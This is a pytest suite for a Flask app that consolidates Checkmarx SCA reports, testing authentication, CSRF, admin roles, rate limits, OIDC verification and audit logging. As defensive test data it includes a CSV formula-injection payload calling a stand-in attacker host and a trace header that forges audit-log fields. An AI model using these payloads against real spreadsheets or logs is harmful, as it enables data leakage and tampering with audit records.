import io
import json
import logging
import os
import sqlite3
import threading
import time
import zipfile
from datetime import timedelta
from io import BytesIO

import jwt
import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from werkzeug.security import generate_password_hash

os.environ.setdefault("SECRET_KEY", "test-import-secret")

import checkmarx_sca_consolidator_v2
from checkmarx_sca_consolidator_v2 import (
    BUILTIN_GROUP_RULES,
    ReportError,
    env_int,
    load_report,
    make_rows,
)
from security import AlbOidcVerifier, AuthenticationError, SlidingWindowLimiter
from web_app import create_app


@pytest.fixture()
def app(tmp_path):
    return create_app(
        {
            "TESTING": True,
            "APP_ENV": "test",
            "AUTH_MODE": "local",
            "SECRET_KEY": "test-secret",
            "DATABASE": str(tmp_path / "users.db"),
            "REPORTS_PER_MINUTE": 100,
        }
    )


@pytest.fixture()
def client(app):
    return app.test_client()


def token(response):
    marker = b'name="csrf_token" value="'
    return response.data.split(marker, 1)[1].split(b'"', 1)[0].decode()


def create_admin(app):
    result = app.test_cli_runner().invoke(
        args=["create-admin"],
        input="reviewer\na-secure-password\na-secure-password\n",
    )
    assert result.exit_code == 0, result.output


def register_and_login(app, client):
    create_admin(app)
    response = client.get("/login")
    response = client.post(
        "/login",
        data={"csrf_token": token(response), "username": "reviewer", "password": "a-secure-password"},
    )
    assert response.status_code == 302


def sample_report(project_name="Demo"):
    return {
        "RiskReportSummary": {"ProjectName": project_name},
        "Packages": [
            {
                "Id": "npm-demo-1.0",
                "Name": "demo",
                "Version": "1.0",
                "IsDirectDependency": True,
                "VulnerabilityCount": 1,
                "HighVulnerabilityCount": 1,
                "Vulnerabilities": [{"CVE": "CVE-2026-1234", "CVSS": 8.1}],
            }
        ],
    }


def post_report(client, response, output_format, report=None):
    return client.post(
        "/report",
        data={
            "csrf_token": token(response),
            "format": output_format,
            "report": (io.BytesIO(json.dumps(report or sample_report()).encode()), "scan.json"),
        },
        content_type="multipart/form-data",
    )


def test_http_setup_is_removed_and_cli_provisioning_is_required(app, client):
    assert client.get("/setup").status_code == 404
    response = client.get("/login")
    assert response.status_code == 503
    assert b"create-admin" in response.data

    create_admin(app)
    assert client.get("/login").status_code == 200


def test_auth_and_ephemeral_preview(app, client, tmp_path):
    assert client.get("/").status_code == 302
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "preview")

    assert response.status_code == 200
    assert b"CVE-2026-1234" in response.data
    assert response.headers["Cache-Control"] == "no-store"
    assert not list(tmp_path.glob("*.json"))


def test_cli_password_recovery_forces_password_change(app, client):
    create_admin(app)
    reset = app.test_cli_runner().invoke(
        args=["reset-password"],
        input="reviewer\ntemporary-password-2026\ntemporary-password-2026\n",
    )
    assert reset.exit_code == 0, reset.output

    response = client.get("/login")
    response = client.post(
        "/login",
        data={
            "csrf_token": token(response),
            "username": "reviewer",
            "password": "temporary-password-2026",
        },
    )
    assert response.status_code == 302
    forced = client.get("/")
    assert forced.status_code == 302
    assert forced.headers["Location"].endswith("/change-password")

    page = client.get("/change-password")
    changed = client.post(
        "/change-password",
        data={
            "csrf_token": token(page),
            "current_password": "temporary-password-2026",
            "new_password": "replacement-password-2026",
            "confirm_password": "replacement-password-2026",
        },
    )
    assert changed.status_code == 302
    assert client.get("/").status_code == 200


def test_admin_panel_creates_regular_user_and_enforces_role(app, client):
    register_and_login(app, client)
    page = client.get("/admin")
    assert page.status_code == 200
    created = client.post(
        "/admin/users",
        data={
            "csrf_token": token(page),
            "username": "analyst",
            "password": "temporary-password-2026",
            "confirm_password": "temporary-password-2026",
        },
        follow_redirects=True,
    )
    assert created.status_code == 200
    assert b"Created analyst" in created.data

    analyst = app.test_client()
    response = analyst.get("/login")
    analyst.post(
        "/login",
        data={
            "csrf_token": token(response),
            "username": "analyst",
            "password": "temporary-password-2026",
        },
    )
    change_page = analyst.get("/change-password")
    analyst.post(
        "/change-password",
        data={
            "csrf_token": token(change_page),
            "current_password": "temporary-password-2026",
            "new_password": "analyst-password-2026",
            "confirm_password": "analyst-password-2026",
        },
    )
    assert analyst.get("/admin").status_code == 403


def test_admin_cannot_delete_own_account(app, client):
    register_and_login(app, client)
    page = client.get("/admin")
    response = client.post(
        "/admin/users/1/delete",
        data={"csrf_token": token(page)},
        follow_redirects=True,
    )
    assert b"cannot delete your own" in response.data
    with sqlite3.connect(app.config["DATABASE"]) as connection:
        assert connection.execute("SELECT count(*) FROM users").fetchone()[0] == 1


def make_admin(app, username):
    with sqlite3.connect(app.config["DATABASE"]) as connection:
        connection.execute(
            "INSERT INTO users(username, password_hash, is_admin) VALUES (?, ?, 1)",
            (username, generate_password_hash("a-secure-password")),
        )
        connection.commit()


def signed_in_admin(app, username):
    client = app.test_client()
    response = client.get("/login")
    client.post(
        "/login",
        data={"csrf_token": token(response), "username": username, "password": "a-secure-password"},
    )
    return client, token(client.get("/admin"))


def admin_usernames(app):
    with sqlite3.connect(app.config["DATABASE"]) as connection:
        return sorted(r[0] for r in connection.execute("SELECT username FROM users WHERE is_admin = 1"))


@pytest.mark.parametrize("trial", range(6))
def test_concurrent_mutual_demotion_cannot_remove_every_administrator(app, trial):
    """Two admins demoting each other at once must not leave the app unmanageable."""
    create_admin(app)  # 'reviewer'
    make_admin(app, "second")
    with sqlite3.connect(app.config["DATABASE"]) as connection:
        ids = dict(connection.execute("SELECT username, id FROM users"))

    first_client, first_csrf = signed_in_admin(app, "reviewer")
    second_client, second_csrf = signed_in_admin(app, "second")

    barrier = threading.Barrier(2)

    def demote(client, csrf, target):
        barrier.wait()
        client.post(
            f"/admin/users/{ids[target]}/role", data={"csrf_token": csrf, "is_admin": "0"}
        )

    threads = [
        threading.Thread(target=demote, args=(first_client, first_csrf, "second")),
        threading.Thread(target=demote, args=(second_client, second_csrf, "reviewer")),
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    assert len(admin_usernames(app)) >= 1


@pytest.mark.parametrize("trial", range(6))
def test_concurrent_deletion_cannot_remove_every_administrator(app, trial):
    create_admin(app)  # 'reviewer'
    make_admin(app, "second")
    with sqlite3.connect(app.config["DATABASE"]) as connection:
        ids = dict(connection.execute("SELECT username, id FROM users"))

    first_client, first_csrf = signed_in_admin(app, "reviewer")
    second_client, second_csrf = signed_in_admin(app, "second")

    barrier = threading.Barrier(2)

    def delete(client, csrf, target):
        barrier.wait()
        client.post(f"/admin/users/{ids[target]}/delete", data={"csrf_token": csrf})

    threads = [
        threading.Thread(target=delete, args=(first_client, first_csrf, "second")),
        threading.Thread(target=delete, args=(second_client, second_csrf, "reviewer")),
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    assert len(admin_usernames(app)) >= 1


def test_reset_password_can_restore_administrator_access_after_lockout(app, client):
    create_admin(app)
    with sqlite3.connect(app.config["DATABASE"]) as connection:
        connection.execute("UPDATE users SET is_admin = 0")
        connection.commit()
    assert admin_usernames(app) == []

    recovered = app.test_cli_runner().invoke(
        args=["reset-password", "--grant-admin"],
        input="reviewer\nrecovered-password-2026\nrecovered-password-2026\n",
    )
    assert recovered.exit_code == 0, recovered.output
    assert admin_usernames(app) == ["reviewer"]

    # A plain reset must not silently hand out administrator access.
    with sqlite3.connect(app.config["DATABASE"]) as connection:
        connection.execute("UPDATE users SET is_admin = 0")
        connection.commit()
    plain = app.test_cli_runner().invoke(
        args=["reset-password"],
        input="reviewer\nanother-password-2026\nanother-password-2026\n",
    )
    assert plain.exit_code == 0, plain.output
    assert admin_usernames(app) == []


def test_report_processing_bug_is_not_reported_as_invalid_input(app, client, monkeypatch):
    """A crash inside the consolidator must surface as a 500, not 'invalid report'."""
    register_and_login(app, client)

    def exploding_make_rows(*args, **kwargs):
        raise AttributeError("regression in make_rows")

    monkeypatch.setattr("web_app.make_rows", exploding_make_rows)
    app.config["PROPAGATE_EXCEPTIONS"] = False
    response = post_report(client, client.get("/"), "preview")
    assert response.status_code == 500


def test_location_fallback_maps_transitive_package_to_direct_package():
    report = {
        "RiskReportSummary": {"ProjectName": "Demo"},
        "Packages": [
            {
                "Id": "direct-1",
                "Name": "app-parent",
                "Version": "3.0",
                "IsDirectDependency": True,
                "Locations": ["services/api/pom.xml"],
            },
            {
                "Id": "trans-1",
                "Name": "vulnerable-lib",
                "Version": "1.2",
                "DependencyType": "Transitive",
                "HighVulnerabilityCount": 1,
                "Locations": ["services/api/pom.xml"],
            },
        ],
    }
    rows, unmapped, _ = make_rows(report, BUILTIN_GROUP_RULES)
    mapped = [row for row in rows if row["Vulnerable Library"].startswith("vulnerable-lib")]
    assert mapped, "the vulnerable package should produce a row"
    assert mapped[0]["Primary Library"] == "app-parent @ 3.0"
    assert unmapped == []


def test_unmapped_rows_do_not_alias_consolidated_rows():
    report = {
        "RiskReportSummary": {"ProjectName": "Demo"},
        "Packages": [
            {
                "Id": "trans-1",
                "Name": "orphan-lib",
                "Version": "1.0",
                "DependencyType": "Transitive",
                "HighVulnerabilityCount": 1,
            }
        ],
    }
    rows, unmapped, _ = make_rows(report, BUILTIN_GROUP_RULES)
    assert unmapped, "an unresolvable package should be reported as unmapped"
    unmapped[0]["Project"] = "mutated"
    assert rows[0]["Project"] == "Demo"


def test_workspace_ui_exposes_formats_and_strict_styles(app, client):
    register_and_login(app, client)
    response = client.get("/")

    assert response.status_code == 200
    for output_format in (b"preview", b"xlsx", b"csv", b"html"):
        assert b'name="format" value="' + output_format + b'"' in response.data
    assert b"Reports are not retained." in response.data
    assert b"/static/styles.css" in response.data
    csp = response.headers["Content-Security-Policy"]
    assert "style-src 'self'" in csp
    assert "object-src 'none'" in csp
    assert "'unsafe-inline'" not in csp


def test_csv_download_neutralizes_formula_injection(app, client):
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "csv", sample_report('=WEBSERVICE("https://attacker.invalid")'))

    assert response.status_code == 200
    assert response.mimetype == "text/csv"
    assert "attachment" in response.headers["Content-Disposition"]
    assert b"'=WEBSERVICE" in response.data


def test_html_download_is_sandboxed(app, client):
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "html")

    assert response.status_code == 200
    assert response.mimetype == "text/html"
    assert "attachment" in response.headers["Content-Disposition"]
    assert "sandbox" in response.headers["Content-Security-Policy"]
    assert b"Checkmarx SCA Consolidated Output" in response.data


def test_xlsx_download_contains_no_formula_cells(app, client):
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "xlsx", sample_report("=1+1"))

    assert response.status_code == 200
    assert response.mimetype == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    with zipfile.ZipFile(BytesIO(response.data)) as workbook:
        worksheet_xml = b"".join(
            workbook.read(name)
            for name in workbook.namelist()
            if name.startswith("xl/worksheets/sheet")
        )
    assert b"<f" not in worksheet_xml


def test_string_vulnerability_counts_are_reportable():
    report = {
        "RiskReportSummary": {"ProjectName": "Demo"},
        "Packages": [
            {
                "Id": "npm-demo-1.0",
                "Name": "demo",
                "Version": "1.0",
                "IsDirectDependency": True,
                "VulnerabilityCount": "1",
                "HighVulnerabilityCount": "1",
            }
        ],
    }
    rows, _, diagnostics = make_rows(report, BUILTIN_GROUP_RULES)
    assert len(rows) == 1
    assert rows[0]["High Count"] == "1"
    assert diagnostics["packages_using_count_fallback"] == 1


def test_zip_json_member_size_is_capped(tmp_path):
    archive = tmp_path / "scan.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("SCA_ScanReport.json", json.dumps(sample_report()))

    with pytest.raises(ReportError, match="too large"):
        load_report(archive, max_json_bytes=10)


def test_deeply_nested_json_is_rejected(tmp_path):
    report_path = tmp_path / "nested.json"
    report_path.write_text('{"nested":' * 80 + "{}" + "}" * 80, encoding="utf-8")
    with pytest.raises(ValueError, match="nesting depth"):
        load_report(report_path, max_depth=32)


def test_report_row_limit_is_enforced():
    report = sample_report()
    report["Packages"][0]["Locations"] = ["a", "b"]
    with pytest.raises(ValueError, match="row limit"):
        make_rows(report, BUILTIN_GROUP_RULES, max_rows=1)


def test_login_is_rate_limited_and_uses_uniform_password_check(app, client):
    create_admin(app)
    response = client.get("/login")
    csrf = token(response)
    for _ in range(5):
        response = client.post(
            "/login",
            data={"csrf_token": csrf, "username": "reviewer", "password": "wrong-password"},
        )
        assert response.status_code == 401
    response = client.post(
        "/login",
        data={"csrf_token": csrf, "username": "reviewer", "password": "wrong-password"},
    )
    assert response.status_code == 429
    assert response.headers["Retry-After"]


def test_alb_oidc_verifier_checks_signature_and_identity():
    private_key = ec.generate_private_key(ec.SECP256R1())
    public_key = private_key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    alb_arn = "arn:aws:elasticloadbalancing:ap-south-1:123456789012:loadbalancer/app/reports/abc123"
    headers = {
        "kid": "test-key",
        "signer": alb_arn,
        "client": "client-123",
        "iss": "https://issuer.example",
        "exp": int(time.time()) + 300,
    }
    encoded = jwt.encode({"sub": "user-123", "email": "reviewer@example.com"}, private_key, algorithm="ES256", headers=headers)
    verifier = AlbOidcVerifier(
        alb_arn,
        "client-123",
        issuer="https://issuer.example",
        key_loader=lambda _region, _kid: public_key,
    )

    assert verifier.verify(encoded, "user-123")["email"] == "reviewer@example.com"
    with pytest.raises(AuthenticationError, match="signed subject"):
        verifier.verify(encoded, "another-user")


def test_production_alb_mode_requires_verified_headers(tmp_path):
    class FakeVerifier:
        def verify(self, token_value, identity):
            if token_value != "signed" or identity != "user-123":
                raise AuthenticationError("invalid")
            return {"sub": identity, "email": "reviewer@example.com"}

    app = create_app(
        {
            "TESTING": True,
            "APP_ENV": "production",
            "AUTH_MODE": "alb_oidc",
            "SECRET_KEY": "a" * 64,
            "SESSION_COOKIE_SECURE": True,
            "TRUSTED_HOSTS": ["reports.example.com"],
            "ALB_ARN": "arn:aws:elasticloadbalancing:ap-south-1:123456789012:loadbalancer/app/reports/abc123",
            "ALB_CLIENT_ID": "client-123",
            "ALB_ISSUER": "https://issuer.example",
            "ALB_LOGOUT_URL": "https://issuer.example/logout",
            "ALB_VERIFIER": FakeVerifier(),
            "DATABASE": str(tmp_path / "unused.db"),
        }
    )
    client = app.test_client()
    rejected = client.get("/", headers={"Host": "reports.example.com"})
    accepted = client.get(
        "/",
        headers={
            "Host": "reports.example.com",
            "X-Amzn-Oidc-Data": "signed",
            "X-Amzn-Oidc-Identity": "user-123",
        },
    )

    assert rejected.status_code == 401
    assert accepted.status_code == 200
    assert accepted.headers["Strict-Transport-Security"].startswith("max-age=31536000")


def test_production_requires_complete_alb_configuration():
    with pytest.raises(RuntimeError, match="ALB_ISSUER"):
        create_app(
            {
                "TESTING": True,
                "APP_ENV": "production",
                "AUTH_MODE": "alb_oidc",
                "SECRET_KEY": "a" * 64,
                "SESSION_COOKIE_SECURE": True,
                "TRUSTED_HOSTS": ["reports.example.com"],
                "ALB_ARN": "arn:aws:elasticloadbalancing:ap-south-1:123456789012:loadbalancer/app/reports/abc123",
                "ALB_CLIENT_ID": "client-123",
                "ALB_VERIFIER": object(),
            }
        )


def test_production_rejects_local_auth_and_weak_secrets(monkeypatch):
    monkeypatch.setenv("SECRET_KEY", "short")
    with pytest.raises(RuntimeError, match="at least 32 bytes"):
        create_app(
            {
                "APP_ENV": "production",
                "AUTH_MODE": "local",
                "SESSION_COOKIE_SECURE": True,
                "TRUSTED_HOSTS": ["reports.example.com"],
            }
        )

    monkeypatch.setenv("SECRET_KEY", "a" * 64)
    with pytest.raises(RuntimeError, match="AUTH_MODE=alb_oidc"):
        create_app(
            {
                "APP_ENV": "production",
                "AUTH_MODE": "local",
                "SESSION_COOKIE_SECURE": True,
                "TRUSTED_HOSTS": ["reports.example.com"],
            }
        )


def test_secret_key_is_required_for_non_test_startup(monkeypatch):
    monkeypatch.delenv("SECRET_KEY", raising=False)
    with pytest.raises(RuntimeError):
        create_app()


# --- CSRF and authorization boundaries -------------------------------------


@pytest.mark.parametrize(
    "path",
    ["/report", "/theme", "/logout", "/admin/users", "/admin/users/1/role", "/admin/users/1/delete"],
)
def test_state_changing_posts_reject_a_missing_or_wrong_csrf_token(app, client, path):
    register_and_login(app, client)
    assert client.post(path, data={}).status_code == 400
    assert client.post(path, data={"csrf_token": "not-the-session-token"}).status_code == 400


ADMIN_MUTATIONS = [
    "/admin/users",
    "/admin/users/1/reset-password",
    "/admin/users/1/role",
    "/admin/users/1/delete",
]


def signed_in_regular_user(app, client):
    """Create a non-admin account and return a client signed in as it."""
    register_and_login(app, client)
    page = client.get("/admin")
    client.post(
        "/admin/users",
        data={
            "csrf_token": token(page),
            "username": "analyst",
            "password": "temporary-password-2026",
            "confirm_password": "temporary-password-2026",
        },
    )
    analyst = app.test_client()
    login_page = analyst.get("/login")
    analyst.post(
        "/login",
        data={
            "csrf_token": token(login_page),
            "username": "analyst",
            "password": "temporary-password-2026",
        },
    )
    change_page = analyst.get("/change-password")
    analyst.post(
        "/change-password",
        data={
            "csrf_token": token(change_page),
            "current_password": "temporary-password-2026",
            "new_password": "analyst-password-2026",
            "confirm_password": "analyst-password-2026",
        },
    )
    return analyst


@pytest.mark.parametrize("path", ADMIN_MUTATIONS)
def test_admin_mutations_reject_a_non_admin_with_a_valid_csrf_token(app, client, path):
    analyst = signed_in_regular_user(app, client)
    csrf = token(analyst.get("/"))
    assert analyst.post(path, data={"csrf_token": csrf}).status_code == 403


@pytest.mark.parametrize("path", ADMIN_MUTATIONS)
def test_admin_mutations_reject_anonymous_callers(app, client, path):
    register_and_login(app, client)
    assert app.test_client().post(path, data={}).status_code == 302


# --- Response size bounds ---------------------------------------------------


def wide_report(packages=400):
    return {
        "RiskReportSummary": {"ProjectName": "Demo"},
        "Packages": [
            {
                "Id": f"pkg-{index}",
                "Name": "padding" * 30,
                "Version": "1.0",
                "IsDirectDependency": True,
                "HighVulnerabilityCount": 1,
                "Locations": ["deep/path/" * 20],
            }
            for index in range(packages)
        ],
    }


def test_preview_is_row_bounded_and_says_so(app, client):
    """The preview renders into one response, so MAX_REPORT_ROWS is not a bound."""
    app.config["MAX_PREVIEW_ROWS"] = 10
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "preview", wide_report(400))

    assert response.status_code == 200
    assert b"Showing the first 10 of 400 findings" in response.data
    assert response.data.count(b'class="data-cell') == 10 * 21
    # The grouped summary is never truncated.
    assert b"Library groups" in response.data


def test_export_byte_cap_rejects_an_oversized_download(app, client):
    app.config["MAX_EXPORT_BYTES"] = 4096
    register_and_login(app, client)
    assert post_report(client, client.get("/"), "csv", wide_report(400)).status_code == 413
    assert post_report(client, client.get("/"), "xlsx", wide_report(400)).status_code == 413


# --- Audit trail ------------------------------------------------------------


@pytest.fixture()
def audit_log(app):
    records = []

    class Capture(logging.Handler):
        def emit(self, record):
            records.append(record.getMessage())

    app.logger.addHandler(Capture())
    app.logger.setLevel(logging.INFO)
    return records


def events(records, name):
    return [line for line in records if f"security_event={name} " in line]


def field(line, key):
    for part in line.split():
        if part.startswith(f"{key}="):
            return part[len(key) + 1 :]
    return None


def test_audit_attributes_privileged_actions_to_the_acting_administrator(app, client, audit_log):
    register_and_login(app, client)
    page = client.get("/admin")
    client.post(
        "/admin/users",
        data={
            "csrf_token": token(page),
            "username": "analyst",
            "password": "temporary-password-2026",
            "confirm_password": "temporary-password-2026",
            "is_admin": "1",
        },
    )

    login = events(audit_log, "login")[-1]
    created = events(audit_log, "admin_user_create")[-1]
    actor = field(login, "actor")

    assert actor and actor != "-"
    # The administrator who performed the change is identified, and is not
    # confused with the account the change was performed on.
    assert field(created, "actor") == actor
    assert field(created, "target") not in (None, "-", actor)
    # The granted role is recorded, so a promotion is distinguishable from a demotion.
    assert field(created, "role") == "admin"


def test_audit_uses_one_stable_identity_across_event_types(app, client, audit_log):
    register_and_login(app, client)
    post_report(client, client.get("/"), "preview")

    login = events(audit_log, "login")[-1]
    report = events(audit_log, "report_processing")[-1]
    assert field(login, "actor") == field(report, "actor") != "-"


def test_audit_neutralizes_forged_fields_in_attacker_controlled_headers(app, client, audit_log):
    """X-Amzn-Trace-Id lands in a key=value line, so it must not forge a field."""
    create_admin(app)
    page = client.get("/login")
    client.post(
        "/login",
        data={"csrf_token": token(page), "username": "reviewer", "password": "wrong-password"},
        headers={"X-Amzn-Trace-Id": "Root=1 outcome=succeeded actor=deadbeefdeadbeef"},
    )
    line = events(audit_log, "login")[-1]

    assert field(line, "outcome") == "rejected"
    # The header content survives for troubleshooting, but as a single quoted
    # token that cannot be read as additional space-delimited pairs.
    assert "deadbeefdeadbeef" in line
    assert len([part for part in line.split() if part.startswith("outcome=")]) == 1
    assert len([part for part in line.split() if part.startswith("actor=")]) == 1
    assert field(line, "actor") == "-"


def test_forwarded_headers_are_ignored_unless_a_proxy_hop_count_is_configured(tmp_path):
    def remote_for(hops):
        app = create_app(
            {
                "TESTING": True,
                "APP_ENV": "test",
                "AUTH_MODE": "local",
                "SECRET_KEY": "s" * 64,
                "DATABASE": str(tmp_path / f"hops{hops}.db"),
                "TRUST_PROXY_HOPS": hops,
            }
        )
        records = []

        class Capture(logging.Handler):
            def emit(self, record):
                records.append(record.getMessage())

        app.logger.addHandler(Capture())
        app.logger.setLevel(logging.INFO)
        create_admin(app)
        client = app.test_client()
        page = client.get("/login")
        client.post(
            "/login",
            data={"csrf_token": token(page), "username": "reviewer", "password": "wrong-password"},
            headers={"X-Forwarded-For": "203.0.113.9"},
        )
        return field(events(records, "login")[-1], "remote")

    assert remote_for(0) == "127.0.0.1"
    assert remote_for(1) == "203.0.113.9"


# --- Resource limits and caches --------------------------------------------


def test_rate_limiter_evicts_old_keys_instead_of_locking_out_new_ones():
    """Limiter keys come from submitted usernames, so a flood must not fail closed."""
    limiter = SlidingWindowLimiter(max_keys=100)
    for index in range(500):
        limiter.check(f"account:attacker{index}", limit=5, window_seconds=300)

    assert limiter.check("account:victim", limit=5, window_seconds=300) == 0
    assert len(limiter._events) <= 100


def test_rate_limiter_still_blocks_a_key_over_its_limit():
    limiter = SlidingWindowLimiter(max_keys=100)
    for _ in range(5):
        assert limiter.check("account:target", limit=5, window_seconds=300) == 0
    assert limiter.check("account:target", limit=5, window_seconds=300) > 0


def public_key_pem():
    return (
        ec.generate_private_key(ec.SECP256R1())
        .public_key()
        .public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    )


def verifier_with(loader, **kwargs):
    return AlbOidcVerifier(
        "arn:aws:elasticloadbalancing:ap-south-1:123456789012:loadbalancer/app/reports/abc123",
        "client-123",
        key_loader=loader,
        **kwargs,
    )


def test_concurrent_requests_for_one_alb_key_share_a_single_fetch():
    """The kid is attacker-controlled and resolved before signature verification."""
    pem = public_key_pem()
    fetched = []

    def slow_loader(_region, kid):
        fetched.append(kid)
        time.sleep(0.2)
        return pem

    verifier = verifier_with(slow_loader)
    threads = [threading.Thread(target=verifier._get_key, args=("shared-kid",)) for _ in range(8)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    assert fetched == ["shared-kid"]


def test_alb_key_cache_evicts_rather_than_refusing_new_keys():
    pem = public_key_pem()
    verifier = verifier_with(lambda _region, _kid: pem, max_cached_keys=4)
    for index in range(10):
        verifier._get_key(f"kid-{index}")

    assert len(verifier._keys) == 4
    # A saturated cache must not break genuine ALB key rotation.
    assert verifier._get_key("kid-after-rotation") == pem


def test_failed_alb_key_lookups_are_negatively_cached():
    attempts = []

    def failing_loader(_region, kid):
        attempts.append(kid)
        raise AuthenticationError("Could not retrieve the ALB public key.")

    verifier = verifier_with(failing_loader)
    for _ in range(5):
        with pytest.raises(AuthenticationError):
            verifier._get_key("broken-kid")

    assert attempts == ["broken-kid"]


def test_package_graph_is_walked_once_per_package(monkeypatch):
    """extract_vulns() dominates report generation; it must not run three times."""
    walks = []
    original = checkmarx_sca_consolidator_v2.recursive_dicts

    def counting(obj, **kwargs):
        walks.append(1)
        return original(obj, **kwargs)

    monkeypatch.setattr(checkmarx_sca_consolidator_v2, "recursive_dicts", counting)

    for counts in ({"HighVulnerabilityCount": 1}, {}):
        walks.clear()
        report = {
            "RiskReportSummary": {"ProjectName": "Demo"},
            "Packages": [
                {
                    "Id": f"pkg-{index}",
                    "Name": f"lib-{index}",
                    "Version": "1.0",
                    "IsDirectDependency": True,
                    "Vulnerabilities": [{"CVE": "CVE-2026-0001", "CVSS": 7.5}],
                    **counts,
                }
                for index in range(50)
            ],
        }
        rows, _, _ = make_rows(report, BUILTIN_GROUP_RULES)
        assert len(rows) == 50
        assert len(walks) == 50


def test_make_rows_honours_the_configured_structural_limits():
    report = {
        "RiskReportSummary": {"ProjectName": "Demo"},
        "Packages": [
            {
                "Id": "pkg",
                "Name": "lib",
                "Version": "1.0",
                "IsDirectDependency": True,
                "Vulnerabilities": [{"CVE": "CVE-2026-0001", "nest": {"a": {"b": {"c": {}}}}}],
            }
        ],
    }
    with pytest.raises(ReportError, match="nesting depth"):
        make_rows(report, BUILTIN_GROUP_RULES, max_depth=2)


# --- Configuration ----------------------------------------------------------


def test_blank_environment_values_fall_back_to_the_default(monkeypatch):
    """A blank variable is how operators 'unset' a value; it must not crash startup."""
    monkeypatch.setenv("MAX_REPORT_ROWS", "")
    assert env_int("MAX_REPORT_ROWS", 50_000) == 50_000
    assert env_int("MAX_REPORT_ROWS", 50_000, 1, 250_000) == 50_000

    monkeypatch.setenv("MAX_REPORT_ROWS", "not-a-number")
    with pytest.raises(RuntimeError, match="must be an integer"):
        env_int("MAX_REPORT_ROWS", 50_000)

    monkeypatch.setenv("MAX_REPORT_ROWS", "999999999")
    with pytest.raises(RuntimeError, match="must be between"):
        env_int("MAX_REPORT_ROWS", 50_000, 1, 250_000)


def test_session_lifetime_honours_an_explicit_override(monkeypatch, tmp_path):
    monkeypatch.setenv("SESSION_LIFETIME_MINUTES", "7")
    app = create_app(
        {
            "TESTING": True,
            "AUTH_MODE": "local",
            "SECRET_KEY": "s" * 64,
            "DATABASE": str(tmp_path / "users.db"),
            "SESSION_LIFETIME_MINUTES": 600,
        }
    )
    assert app.config["PERMANENT_SESSION_LIFETIME"] == timedelta(minutes=600)
